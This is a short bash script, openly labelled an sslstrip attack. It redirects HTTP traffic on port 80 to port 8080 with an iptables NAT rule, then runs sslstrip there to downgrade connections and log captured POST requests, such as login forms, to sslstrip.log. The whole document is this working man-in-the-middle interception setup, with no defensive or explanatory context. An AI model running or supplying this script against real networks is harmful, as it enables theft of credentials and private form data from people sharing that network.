#!/bin/bash
# sslstrip attack that will put intresting POST requests in sslstrip.log
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
sudo sslstrip -l 8080
